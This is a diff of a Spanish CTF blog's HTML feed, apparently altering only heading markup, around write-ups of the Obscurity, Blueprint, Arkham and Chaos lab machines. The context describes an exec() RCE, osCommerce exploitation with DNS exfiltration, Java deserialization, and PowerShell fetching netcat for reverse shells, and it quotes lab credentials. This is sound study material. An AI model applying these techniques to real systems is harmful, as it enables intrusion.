@@ -43,7 +43,7 @@
     &lt;img src=&#34;https://sckull.github.io/images/posts/htb/obscurity/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
   &lt;/div&gt;
 
-&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
+&lt;h1 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h1&gt;
 &lt;table&gt;
 &lt;thead&gt;
 &lt;tr&gt;
@@ -74,7 +74,7 @@
 &lt;/tr&gt;
 &lt;/tbody&gt;
 &lt;/table&gt;
-&lt;h2 id=&#34;nmap-&#34;&gt;NMAP&lt;/h2&gt;
+&lt;h1 id=&#34;nmap&#34;&gt;NMAP&lt;/h1&gt;
 &lt;p&gt;Escaneo de puertos tcp/udp y servicios con masscan y nmap.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -250,12 +250,12 @@ SF:-spinner&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;20sk-spinner-wordpress&
 &lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;# Nmap done at Wed Jan  8 20:24:22 2020 -- 1 IP address (1 host up) scanned in 373.38 seconds
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h3 id=&#34;http-&#34;&gt;HTTP&lt;/h3&gt;
+&lt;/div&gt;&lt;h2 id=&#34;http&#34;&gt;HTTP&lt;/h2&gt;
 &lt;p&gt;En el puerto 8080 encontramos una pagina web, la cual contiene informacion sobre una &lt;strong&gt;empresa&lt;/strong&gt;.&lt;br /&gt;
 &lt;img src=&#34;https://sckull.github.io/images/posts/htb/obscurity/Screenshot_2020-01-10_00-33-30.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;En la parte de abajo encontramos un mensaje dirigido a los desarrolladores, dando a entender que en el directorio secreto se encuentra el codigo fuente de la pagina.&lt;br /&gt;
 &lt;img src=&#34;https://sckull.github.io/images/posts/htb/obscurity/Screenshot_2020-01-10_00-34-29.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
-&lt;h3 id=&#34;wfuzz-&#34;&gt;WFUZZ&lt;/h3&gt;
+&lt;h2 id=&#34;wfuzz&#34;&gt;WFUZZ&lt;/h2&gt;
 &lt;p&gt;Utilizamos wfuzz para encontrar el archivo &amp;lsquo;SuperSecureServer.py&amp;rsquo;.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -307,7 +307,7 @@ Requests/sec.: 39.58142
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;Encontramos el archivo &amp;lsquo;SuperSecureServer.py&amp;rsquo; del servidor.&lt;br /&gt;
 &lt;img src=&#34;https://sckull.github.io/images/posts/htb/obscurity/Screenshot_2020-01-10_00-36-33.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;rce---supersecureserverpy-&#34;&gt;RCE - SuperSecureServer.py&lt;/h2&gt;
+&lt;h1 id=&#34;rce---supersecureserverpy&#34;&gt;RCE - SuperSecureServer.py&lt;/h1&gt;
 &lt;p&gt;Analizamos el codigo del archivo y encontramos una vulnerabilidad la cual se encuentra al realizar una consulta a de un directorio. Al pasarle un directorio (&amp;lsquo;directorioABC&amp;rsquo;) entre comillas, este elimina las comillas, pasa por la funcion &lt;code&gt;exec()&lt;/code&gt; y se utiliza el directorio como una variable en un string, en el caso de que no haya errores sigue ejecutandose el codigo.&lt;/p&gt;
 &lt;p&gt;Codigo vulnerable:&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
@@ -376,7 +376,7 @@ Requests/sec.: 39.58142
 &lt;span class=&#34;n&#34;&gt;r&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;requests&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;get&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;url&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h2 id=&#34;user---robert-&#34;&gt;USER - Robert&lt;/h2&gt;
+&lt;/div&gt;&lt;h1 id=&#34;user---robert&#34;&gt;USER - Robert&lt;/h1&gt;
 &lt;p&gt;Enumeramos la carpeta principal del usuario robert, encontramos varios archivos, un script en python que &lt;strong&gt;encripta/desencripta&lt;/strong&gt; archivos utilizando una clave.&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/obscurity/Screenshot_2020-01-10_14-54-17.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;Tambien vemos archivos en texto plano, pero dos de ellos parecen estar encriptados por el script.&lt;/p&gt;
@@ -447,7 +447,7 @@ www-data@obscure:/home/robert$
 &lt;p&gt;Obtenemos una contraseña, utilizamos la contraseña con el usuario robert y obtenemos una shell y nuestra flag &lt;strong&gt;user.txt&lt;/strong&gt;:&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;robert:SecThruObsFTW
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/obscurity/Screenshot_2020-01-10_15-05-25.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;privilege-escalation-&#34;&gt;PRIVILEGE ESCALATION&lt;/h2&gt;
+&lt;h1 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h1&gt;
 &lt;p&gt;Enumeramos los comandos que pueden ser ejecutados con privilegios de root sin contraseña, encontramos un script en python.&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/obscurity/Screenshot_2020-01-10_15-06-47.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;Dicho script pregunta por usuario y su contraseña existentes en la maquina, lee &lt;code&gt;/etc/shadow&lt;/code&gt; y escribe su contenido en &lt;code&gt;/tmp/SSH/&lt;/code&gt;, solo si las credenciales dadas corresponden a uno de los usuarios, el script ejecuta los comandos que se le pasen y elimina el archivo creado en /tmp/SSH/.&lt;/p&gt;
@@ -526,7 +526,7 @@ root:mercedes&lt;/p&gt;
     &lt;img src=&#34;https://sckull.github.io/images/posts/thm/blueprint/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
   &lt;/div&gt;
 
-&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
+&lt;h1 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h1&gt;
 &lt;table&gt;
 &lt;thead&gt;
 &lt;tr&gt;
@@ -555,7 +555,7 @@ root:mercedes&lt;/p&gt;
 &lt;/table&gt;
 &lt;br&gt;
 &lt;hr /&gt;
-&lt;h2 id=&#34;masscan--nmap-&#34;&gt;MASSCAN &amp;amp; NMAP&lt;/h2&gt;
+&lt;h1 id=&#34;masscan--nmap&#34;&gt;MASSCAN &amp;amp; NMAP&lt;/h1&gt;
 &lt;p&gt;Escaneo de puertos tcp/udp y sus servicios, nmap nos muestra varios puertos abiertos.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -723,10 +723,10 @@ Service detection performed. Please report any incorrect results at https://nmap
 &lt;span class=&#34;c1&#34;&gt;# Nmap done at Fri Dec 13 00:35:22 2019 -- 1 IP address (1 host up) scanned in 116.94 seconds&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h2 id=&#34;http-&#34;&gt;HTTP&lt;/h2&gt;
+&lt;/div&gt;&lt;h1 id=&#34;http&#34;&gt;HTTP&lt;/h1&gt;
 &lt;p&gt;Encontramos que en el puerto 8080 esta corriendo osCommerce.&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/blueprint/Screenshot_2019-12-27_22-24-42.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;gobuster-&#34;&gt;GOBUSTER&lt;/h2&gt;
+&lt;h2 id=&#34;gobuster&#34;&gt;GOBUSTER&lt;/h2&gt;
 &lt;p&gt;Utilzamos gobuster en el directorio de oscommers para buscar archivos que puedan ser de utilidad.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -879,7 +879,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 &lt;/div&gt;&lt;h2 id=&#34;searcsploit-&#34;&gt;SEARCSPLOIT&lt;/h2&gt;
 &lt;p&gt;Con el nombre y la version de oscommerce encontramos varias vulnerabilidades y exploits que afectan a esta plataforma.&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/blueprint/Screenshot_2019-12-27_22-27-20.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;oscommerce-2341---remote-code-execution-&#34;&gt;osCommerce 2.3.4.1 - Remote Code Execution&lt;/h2&gt;
+&lt;h1 id=&#34;oscommerce-2341---remote-code-execution&#34;&gt;osCommerce 2.3.4.1 - Remote Code Execution&lt;/h1&gt;
 &lt;p&gt;Utilizamos el exploit &lt;code&gt;Remote Code Execution&lt;/code&gt;, nos permitira ejecutar comandos en el sistema, pero para ello debemos de configurar la ruta de la maquina en el exploit, de igual forma el payload que ejecuta una shell inversa no funciona ya que es un sistema windows.&lt;/p&gt;
 &lt;p&gt;Para poder ver el resultado de la ejecucion de nuestro comando podemos utilizar la tecnica de &lt;a href=&#34;https://www.youtube.com/watch?v=Egwp5zc5ZIM&#34;&gt;&lt;strong&gt;DNS exfil&lt;/strong&gt;&lt;/a&gt; (y por los loles xd).&lt;/p&gt;
 &lt;p&gt;Nuestro payload se veria de la siguiente forma si deseamos ver el path donde estamos actualmente.&lt;/p&gt;
@@ -941,7 +941,7 @@ payload += &amp;#39;/*&amp;#39;
 &lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/blueprint/Screenshot_2019-12-27_23-13-14.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;Tenemos permisos de administrador en la maquina y podemos ver la direccion actual en la que nos encontramos, de igual forma podemos leer nuestra bandera que se encuentra en el directorio del usuario administrator.&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/blueprint/Screenshot_2019-12-27_23-15-29.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;shell---metasploit-&#34;&gt;Shell - Metasploit&lt;/h2&gt;
+&lt;h1 id=&#34;shell---metasploit&#34;&gt;Shell - Metasploit&lt;/h1&gt;
 &lt;p&gt;Utilizando metasploit con certutil podemos obtener una shell y sacar el archivo que contiene los hash de los usuarios en windows para ello vamos a crear nuestro payload con msfvenom y poner a la escucha metasploit.&lt;/p&gt;
 &lt;p&gt;Msfvenom:&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
@@ -1043,7 +1043,7 @@ payload += &amp;#39;/*&amp;#39;
     &lt;img src=&#34;https://sckull.github.io/images/posts/htb/arkham/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
   &lt;/div&gt;
 
-&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
+&lt;h1 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h1&gt;
 &lt;table&gt;
 &lt;thead&gt;
 &lt;tr&gt;
@@ -1074,7 +1074,7 @@ payload += &amp;#39;/*&amp;#39;
 &lt;/tr&gt;
 &lt;/tbody&gt;
 &lt;/table&gt;
-&lt;h2 id=&#34;masscan-&#34;&gt;MASSCAN&lt;/h2&gt;
+&lt;h1 id=&#34;masscan--nmap-&#34;&gt;MASSCAN &amp;amp; NMAP&lt;/h1&gt;
 &lt;p&gt;Escaneo de puertos tcp/udp.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -1106,8 +1106,7 @@ Discovered open port 8080/tcp on 10.10.10.130
 Discovered open port 49667/tcp on 10.10.10.130
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h2 id=&#34;nmap-&#34;&gt;NMAP&lt;/h2&gt;
-&lt;p&gt;Escaneo de servicios en puertos anteriormente encontrados.&lt;/p&gt;
+&lt;/div&gt;&lt;p&gt;Escaneo de servicios en puertos anteriormente encontrados.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
@@ -1146,7 +1145,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap &lt;span class=&#34;k&#34;&gt;done&lt;/span&gt;: &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; IP address &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; host up&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; scanned in 68.49 seconds
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h2 id=&#34;smb-&#34;&gt;SMB&lt;/h2&gt;
+&lt;/div&gt;&lt;h1 id=&#34;smb-&#34;&gt;SMB&lt;/h1&gt;
 &lt;p&gt;Buscamos los sharenames a los que tengamos acceso.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -1408,7 +1407,7 @@ appserver.zip  backup.img  IMPORTANT.txt  tmp
 &lt;span class=&#34;nt&#34;&gt;&amp;lt;/context-param&amp;gt;&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h2 id=&#34;http---8080-&#34;&gt;HTTP - 8080&lt;/h2&gt;
+&lt;/div&gt;&lt;h1 id=&#34;http---8080-&#34;&gt;HTTP - 8080&lt;/h1&gt;
 &lt;p&gt;Puerto 8080 en http.&lt;br /&gt;
 &lt;img src=&#34;https://sckull.github.io/images/posts/htb/arkham/Screenshot%20from%202019-03-25%2017-47-40.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
 &lt;h2 id=&#34;gobuster-&#34;&gt;GOBUSTER&lt;/h2&gt;
@@ -1424,7 +1423,7 @@ appserver.zip  backup.img  IMPORTANT.txt  tmp
 &lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/arkham/Screenshot%20from%202019-04-15%2017.07.10.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
 &lt;h2 id=&#34;viewstate-&#34;&gt;ViewState&lt;/h2&gt;
 &lt;p&gt;JSF utiliza viewStates para almacenar los datos de la vista, pueden ser &amp;lsquo;almacenados&amp;rsquo; en el servidor o el cliente, dichos valores de viewstate estan dentro del html de una pagina como un campo oculto con el nombre de &lt;code&gt;javax.faces.ViewState&lt;/code&gt;, como es el caso de la pagina que encontramos.&lt;/p&gt;
-&lt;h3 id=&#34;java-deserialization-&#34;&gt;Java Deserialization&lt;/h3&gt;
+&lt;h1 id=&#34;java-deserialization-&#34;&gt;Java Deserialization&lt;/h1&gt;
 &lt;p&gt;Deserializacion y Serializacion es el proceso por el cual se convierte un objeto a bytes y viceversa, para leerlo e interpretarlo por el servidor. Al investigar acerca de dichos valores encontramos que, existe una vulnerabilidad de deserializacion en java, dichos valores del viewstate estan codificados en base64 en algunos casos no estan encriptados por lo que puede ser leido el contenido.&lt;/p&gt;
 &lt;p&gt;Al intentar decodificar en base64 nos muestran algunos caracteres, por lo que podemos afirmar que el objeto esta encoriptado.&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/arkham/Screenshot%20from%202019-04-15%2017.16.28.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
@@ -1575,9 +1574,13 @@ appserver.zip  backup.img  IMPORTANT.txt  tmp
 &lt;/div&gt;&lt;p&gt;&lt;em&gt;Funciona tambien con la version ysoserial.jar, pero se tienen comandos &amp;lsquo;limitados&amp;rsquo;, la version modificada es una mejor version que nos permite ejecutar comandos cmd/powershell/sh.&lt;/em&gt;&lt;/p&gt;
 &lt;p&gt;Ya que desconocemos del payload que funciona, utilizamos los descritos anteriormente, vamos a hacer un request DNS a nuestra maquina con cada payload (ej: &lt;code&gt;nslookup CommonsCollections1 10.10.1X.1X&lt;/code&gt;) y el payload que funcione nos aparecerá en nuestra terminal (Utilizamos &lt;a href=&#34;https://github.com/SpiderLabs/Responder&#34;&gt;&lt;strong&gt;responder&lt;/strong&gt;&lt;/a&gt;).&lt;/p&gt;
 &lt;p&gt;Aqui se encuentra el codigo:&lt;/p&gt;
-&lt;h4 id=&#34;codigo-java---githubhttpsgithubcomsckullctf-stufftreemasterarkham-&#34;&gt;&lt;a href=&#34;https://github.com/sckull/ctf-stuff/tree/master/arkham&#34;&gt;&lt;strong&gt;Codigo Java - GitHub&lt;/strong&gt;&lt;/a&gt;&lt;/h4&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://github.com/sckull/ctf-stuff/tree/master/arkham&#34;&gt;&lt;strong&gt;Codigo Java - GitHub&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
 &lt;p&gt;De igual forma realice un script en python para el mismo fin, utilizando la libreria pydes.&lt;/p&gt;
-&lt;h4 id=&#34;codigo-python---githubhttpsgithubcomsckullctf-stuffblobmasterarkhamdeserialization-javapy-&#34;&gt;&lt;a href=&#34;https://github.com/sckull/ctf-stuff/blob/master/arkham/deserialization-java.py&#34;&gt;&lt;strong&gt;Codigo Python - GitHub&lt;/strong&gt;&lt;/a&gt;&lt;/h4&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://github.com/sckull/ctf-stuff/blob/master/arkham/deserialization-java.py&#34;&gt;&lt;strong&gt;Codigo Python - GitHub&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
 &lt;h2 id=&#34;rce---request-dns-&#34;&gt;RCE - Request DNS&lt;/h2&gt;
 &lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/arkham/Peek%202019-04-17%2017-49.gif&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;Obtenemos un request DNS y vemos que los payloads que funcionan en arkham son &lt;code&gt;CommonsCollections5, CommonsCollections6&lt;/code&gt;, por lo que podemos utilizar cualquiera de ellos para ejecutar comandos en la maquina.&lt;/p&gt;
@@ -1601,7 +1604,7 @@ appserver.zip  backup.img  IMPORTANT.txt  tmp
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/arkham/Screenshot%20from%202019-04-17%2018.15.01.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;reverse-shell---alfred-&#34;&gt;REVERSE SHELL - Alfred&lt;/h2&gt;
+&lt;h1 id=&#34;reverse-shell---alfred-&#34;&gt;REVERSE SHELL - Alfred&lt;/h1&gt;
 &lt;p&gt;Para obtener una shell inversa vamos a utilizar powershell para descargar netcat (&lt;code&gt;nc.exe&lt;/code&gt;) y ejecutar una shell inversa.&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;Comando&lt;/strong&gt;: Cambiamos el primer parametro de cmand a &amp;ldquo;powershell&amp;rdquo;.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
@@ -1620,7 +1623,7 @@ appserver.zip  backup.img  IMPORTANT.txt  tmp
 &lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/arkham/Screenshot%20from%202019-04-17%2018.57.42.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;Vemos que Batman pertenece al grupo de Administrators.&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/arkham/Screenshot%20from%202019-04-17%2019.01.12.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;user---batman-&#34;&gt;USER - BATMAN&lt;/h2&gt;
+&lt;h1 id=&#34;user---batman-&#34;&gt;USER - BATMAN&lt;/h1&gt;
 &lt;p&gt;En el directorio &lt;code&gt;C:\Users\alfred\Downloads\backups&lt;/code&gt; encontramos un archivo &lt;code&gt;backup.zip&lt;/code&gt;, lo trasladamos a nuestra maquina con &lt;a href=&#34;https://nakkaya.com/2009/04/15/using-netcat-for-file-transfers/&#34;&gt;&lt;strong&gt;netcat&lt;/strong&gt;&lt;/a&gt;.&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/arkham/Screenshot%20from%202019-04-17%2018.37.16.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;Al descomprimirlo nos muestra un archivo &lt;code&gt;.ost&lt;/code&gt; de Microsoft Outlook, utilizamos readpst para leer el archivo de correos el cual nos extrajo los borradores (&lt;code&gt;Drafts.mbox&lt;/code&gt;).&lt;/p&gt;
@@ -1657,7 +1660,7 @@ appserver.zip  backup.img  IMPORTANT.txt  tmp
 &lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/arkham/Peek%202019-04-17%2019-03.gif&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;Exitosamente pudimos cambiar al usuario Batman pero no podemos listar los directorios y archivos.&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/arkham/Screenshot%20from%202019-04-17%2019.05.15.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;reverse-shell---batman-&#34;&gt;REVERSE SHELL - BATMAN&lt;/h2&gt;
+&lt;h1 id=&#34;reverse-shell---batman-&#34;&gt;REVERSE SHELL - BATMAN&lt;/h1&gt;
 &lt;p&gt;Para obtener una shell inversa con el usuario Batman vamos a utilizar &lt;code&gt;Invoke-Command&lt;/code&gt; para descargar netcat (&lt;code&gt;nc.exe&lt;/code&gt;) en el directorio de Batman y ejecutar una shell inversa, el siguiente comando se ejecuta con el usuario alfred.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -1757,7 +1760,7 @@ appserver.zip  backup.img  IMPORTANT.txt  tmp
 
 &lt;br&gt;
 &lt;hr /&gt;
-&lt;h2 id=&#34;masscan-&#34;&gt;MASSCAN&lt;/h2&gt;
+&lt;h1 id=&#34;masscan--nmap-&#34;&gt;MASSCAN &amp;amp; NMAP&lt;/h1&gt;
 &lt;p&gt;Escaneo de puertos udp/tcp.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -1789,8 +1792,7 @@ Discovered open port 995/tcp on 10.10.10.120
 Discovered open port 993/tcp on 10.10.10.120
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h2 id=&#34;nmap-&#34;&gt;NMAP&lt;/h2&gt;
-&lt;p&gt;Escaneo de puertos con nmap.&lt;/p&gt;
+&lt;/div&gt;&lt;p&gt;Escaneo de puertos con nmap.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
@@ -1827,7 +1829,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap &lt;span class=&#34;k&#34;&gt;done&lt;/span&gt;: &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; IP address &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; host up&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; scanned in 48.15 seconds
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h2 id=&#34;http-&#34;&gt;HTTP&lt;/h2&gt;
+&lt;/div&gt;&lt;h1 id=&#34;http-&#34;&gt;HTTP&lt;/h1&gt;
 &lt;p&gt;Al visitar la pagina en el puerto 80 nos muestra un mensaje &lt;code&gt;Direct IP not allowed&lt;/code&gt;.&lt;br /&gt;
 &lt;img src=&#34;https://sckull.github.io/images/posts/htb/chaos/Screenshot_20190523_131403.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
 &lt;h2 id=&#34;wfuzz-&#34;&gt;WFUZZ&lt;/h2&gt;
@@ -1887,7 +1889,7 @@ ID   Response   Lines      Word         Chars          &lt;span class=&#34;nv&#3
 004445:  &lt;span class=&#34;nv&#34;&gt;C&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;301&lt;/span&gt;      &lt;span class=&#34;m&#34;&gt;9&lt;/span&gt; L	      &lt;span class=&#34;m&#34;&gt;28&lt;/span&gt; W	    &lt;span class=&#34;m&#34;&gt;319&lt;/span&gt; Ch	  &lt;span class=&#34;s2&#34;&gt;&amp;#34;wordpress&amp;#34;&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h3 id=&#34;wpwordpress-&#34;&gt;/wp/wordpress&lt;/h3&gt;
+&lt;/div&gt;&lt;h2 id=&#34;wpwordpress-&#34;&gt;/wp/wordpress&lt;/h2&gt;
 &lt;p&gt;Al visitar la ruta &lt;code&gt;http://10.10.10.120/wp/wordpress/&lt;/code&gt; nos muestra una pagina en wordpress, y un post en el que nos indica que para poder ver el contenido del mismo necesitamos ingresar la contraseña.&lt;/p&gt;
 &lt;p&gt;Obtuvimos la contraseña por medio de la herramienta &lt;code&gt;WPSCAN&lt;/code&gt; haciendo un escaneo a la pagina, la contraseña con la que pudimos desbloquear el post fue un usuario que encontramos con WPSCAN.&lt;/p&gt;
 &lt;h2 id=&#34;wpscan---users-&#34;&gt;WPSCAN - Users&lt;/h2&gt;
@@ -1904,7 +1906,7 @@ password – jiujitsu
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;Las credenciales que nos muestran son las de el webmail.&lt;/p&gt;
-&lt;h2 id=&#34;http---puerto-10000-&#34;&gt;HTTP - PUERTO 10000&lt;/h2&gt;
+&lt;h1 id=&#34;http---puerto-10000-&#34;&gt;HTTP - PUERTO 10000&lt;/h1&gt;
 &lt;p&gt;Al visitar este puerto nos muestra una pagina con un mensaje y una url, agregamos chaos a nuestro archivo &lt;code&gt;/etc/hosts&lt;/code&gt; con la IP de la maquina para averiguar lo que obtenemos en ese dominio.&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/chaos/Screenshot_20190523_135937.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
